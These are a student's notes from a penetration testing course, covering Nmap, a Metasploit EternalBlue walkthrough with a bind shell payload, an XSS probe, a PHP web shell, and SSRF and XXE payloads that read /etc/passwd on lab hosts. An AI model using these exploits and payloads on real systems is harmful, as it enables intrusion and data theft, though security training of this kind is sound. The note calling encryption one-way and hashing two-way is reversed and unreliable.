<!---DOC:Secarma Pentesting notes;Notes that I took while at the pentesting course;Sean Lewis-->
# Secarma Pentesting fun times

## Introduction

We'll be getting the slides after the 3 sessions.

## Day 1

### Basics

Laws:

* Incredibly vague to cover more ground
  - It is illegal to connect to someone's wifi, technically your connection is logged which is "unauthorized access to computer material."

KALI LINUX:

* Information security professionals platform of choice
* Debatable whether it is good or not?
* Built upon Debian Linux, real damn stable.
* Covering three tools:
  - Nmap - networks
  - Burpsuite - web applications
  - Metasploit - a lot, for now servers

Burpsuite:

* Java based
* Can be done manually or automatically
* Used to enumerate, scan and attack web applications.

Transmission Control Protocol (TCP):

* Operates at level 4 OSI model
* Reliable for the transfer of data


User Datagram Protocol (UDP):

* Also operates at level 4 OSI model
* Connectionless - no guarantee that data will arrive at its destination
* Often used for VOIP

Common ports:

* 80: HTTP
* 443: HTTPS
* 21: FTP (but technically the connection part of it?)

OSI model:

* 7) Application
* 6) Presentation
* 5) Session
* 4) Transport
* 3) Network
* 2) Data Link
* 1) Physical

NMAP:

* Free and open source
* Used to determine what hosts are on a network, what services they run and what ports are open.
* Some command line switches:
  - -v Verbose.
  - -p Scans all 66535 TCP ports.
  - -sC Performs a script scan using a default set of scripts from the nmap scripting engine (NSE).
  - -sV Performs a version scan of the open ports that nmap discovers.
  - -oA
* NMAP scripting engine
  - Allows users to write and share simple scripts to automate a wide variety of networking tasks.
  - We can gather more sophisticated version detection, vulnerability detection and in some cases we can even use them for vulnerability exploitation.
  - Has the extension `'.nse'` located at `/usr/share/nmap/scripts` in KALI.

```bash
# Example commands!

# Scan range 0/24 all ports including 0
nmap -p- 10.0.6.0/24

# Scan range 0/24 all ports excluding 0
nmap -p0- 10.0.6.0/24
```

### NMAP Exploit!

First, I needed to gather some information on the target system. For me, the IP address was `10.0.6.46`.

```bash
nmap -Pn -sTV -A 10.0.6.46
```

This returned the specific version of Windows, so literally appending "exploit" to the version it gave `Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)`.

This lead to this link: https://www.exploit-db.com/exploits/42315/

I took the name of the exploit, and searched for it with metasploit: _"metasploit eternalblue"_. This gave instructions for using metasploit! https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue.

I ran `msfconsole` to open Metasploit. The website that had instructions gave the correct explit to load:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

This will set up the exploit. From here you can view the options:

```bash
show options
```

It will list all of the options, their current values and whether they are required for the exploit. One required option will be missing, `RHOST`. Set this to the target server with the following command:

```bash
set RHOST 10.0.6.46
```

Now we will need to select the payload. The exploit will get us access to the system, but we will need to execute something while we are there. You can view all of the available payloads for the exploit using:

```bash
show payloads
```

I wanted access to a command shell, so I used the following command to select it:

```bash
set payload generic/shell_bind_tcp
```

If this exploit supported checking, we could have ran a command that would have checked if it would be successful. The command would have been:

```bash
check
```

If it is attempted with the current exploit and payload, it will just display `This module does not support check`.

To execute the exploit, you can run either of these two commands:

* The normal, less to type way `run`
* The cooler sounding way `exploit`

There will be a lot of output, but if it was successful typing `dir` and pressing enter should display the directory on the Windows machine. There you have it, you are officially a `H A C K E R  M A N`.

### Web 101

Forced browsing:

* Some good options:
  - Dirbuster: not too great
    - Available on Kali.
    - Wordlist location in kali is `/usr/share/wordlists`.

Don't leak info:

* A default 404 page can leak information on what the system is
* Bad error messages can leak database schema/SQL version

XSS:

* Three types:
  * Reflected XSS
    - URL
  * Stored XSS
    - Hits everybody
  * DOM XSS
*  Modern browsers will strip bad JavaScript, prevent XSS.
  - This will not help older browsers/systems.
* Initial testing to see if XSS works:

```html
<script>alert(1)</script>
```

SQL Injection:

* One of the oldest and most prevalent vulnerabilities.
* It impacts:
  - Confidentiality
  - Integrity
  - Availability


## Day 2

### Web 202

Some common flaws:

* Misconfiguration
  - Web servers and web applications are complex - inexperienced admins could miss a setting which may open an avenue of an attack.
  - Experienced admins may cut corners or make incorrect judgement due to their inherent familarity with these servers.
  - Segregation - ensure that there is separation between the actual domain controller and subsequent IIS services.
* Input validation
  - A mechanism that is used to verify information that is entered into an application.
  - Nearly all modern-day web applications have some sort of need for input validation.
* Error messages
  - Overly verbose error messages.
  - Reveals a lot of information about both the server and the application, can be used to find exploits.

Transport Layer Socket (TLS) / Secure Socket Layer (SSL)

* TLS required to send data in an encrypted data.
* Allows us to send traffic over HTTPS rather than just HTTP.
* TLS makes use of one or more cipher suites.
  - ROT13: The worst one, rotate the letters 13 characters over.
* Cipher Suite contains a combination of authentication, encryption and message authentication code algorithms.
* Most of the common configuration mistakes when implementing TLS lie in the choice of cipher suites. They could use old and outdated ones.

Here is an example of a run of **sslscan** which provides information on a server's TLS support.

```bash
root@kali:~# sslscan https://google.com
Version: 1.11.12-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 216.58.198.174

Testing SSL server google.com on port 443 using SNI name google.com

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
Accepted  TLSv1.2  128 bits  AES128-SHA                   
Accepted  TLSv1.2  256 bits  AES256-SHA                   
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA                 
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                   
Accepted  TLSv1.1  256 bits  AES256-SHA                   
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA                 
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.google.com
Altnames: DNS:*.google.com, DNS:*.android.com, DNS:*.appengine.google.com, DNS:*.cloud.google.com, DNS:*.g.co, DNS:*.gcp.gvt2.com, DNS:*.ggpht.cn, DNS:*.google-analytics.com, DNS:*.google.ca, DNS:*.google.cl, DNS:*.google.co.in, DNS:*.google.co.jp, DNS:*.google.co.uk, DNS:*.google.com.ar, DNS:*.google.com.au, DNS:*.google.com.br, DNS:*.google.com.co, DNS:*.google.com.mx, DNS:*.google.com.tr, DNS:*.google.com.vn, DNS:*.google.de, DNS:*.google.es, DNS:*.google.fr, DNS:*.google.hu, DNS:*.google.it, DNS:*.google.nl, DNS:*.google.pl, DNS:*.google.pt, DNS:*.googleadapis.com, DNS:*.googleapis.cn, DNS:*.googlecommerce.com, DNS:*.googlevideo.com, DNS:*.gstatic.cn, DNS:*.gstatic.com, DNS:*.gstaticcnapps.cn, DNS:*.gvt1.com, DNS:*.gvt2.com, DNS:*.metric.gstatic.com, DNS:*.urchin.com, DNS:*.url.google.com, DNS:*.youtube-nocookie.com, DNS:*.youtube.com, DNS:*.youtubeeducation.com, DNS:*.youtubekids.com, DNS:*.yt.be, DNS:*.ytimg.com, DNS:android.clients.google.com, DNS:android.com, DNS:developer.android.google.cn, DNS:developers.android.google.cn, DNS:g.co, DNS:ggpht.cn, DNS:goo.gl, DNS:google-analytics.com, DNS:google.com, DNS:googlecommerce.com, DNS:source.android.google.cn, DNS:urchin.com, DNS:www.goo.gl, DNS:youtu.be, DNS:youtube.com, DNS:youtubeeducation.com, DNS:youtubekids.com, DNS:yt.be
Issuer:   Google Internet Authority G3

Not valid before: Oct 30 13:15:05 2018 GMT
Not valid after:  Jan 22 13:15:00 2019 GMT
```

> Encryption is a one-way function, hashing is a two-way function. They are not the same.

### Web 303

#### Unrestricted file upload

The upload functionality exposes a vulnerability which an attacker can exploit, by uploading a malicious script, an attacker can gain access/see resources etc. One potential attack would be uploading a web shell php script. You can find some pretty neat ones [here](https://github.com/JohnTroony/php-webshells). An example would be:

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

In the example given, we were allowed to upload a photo. We trapped the POST request with `burpsuite`, edited the script's content type (mime type) to `image/png` then forwarded it. Accessing the post we made and copying the image location, we could run commands like so `http://10.0.10.55/empbulletin/storage/bed89a4de13a3c70ba6ae128912b6679.php?cmd=cat+/etc/passwd`. This gave us the password file.

#### Server Side Request Forgery SSRF

In computer security, server-side request forgery is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker. 

We were also able to change the POST to set the image url to `file:///etc/passwd` which retrieved the password file instead. Copying the image location in the final message and navigating to it will lead to that file.

#### XML External Entity (XXE)

A type of attack against an application that parses XML input. Some parsers don't sanitize input properly, allowing attackers to send a command. Some example XML can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection).

For this application, if we can create our own XML entity and include it in the existent XML we should be able to get the XML parser to read our request.

During the POST, I changed the `XML` from `<request><id>19</id></request>` to

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE request [  
  <!ELEMENT request ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><request><id>19&xxe;</id></request>
```

This rendered the `/etc/passwd` file.

## Day 3

## Further reading

* [Everyday Cryptography: Fundamental Principles & Applications](https://www.amazon.co.uk/Everyday-Cryptography-Fundamental-Principles-Applications/dp/0199695598/ref=sr_1_2?ie=UTF8&qid=1542826701&sr=8-2&keywords=everyday+cryptography)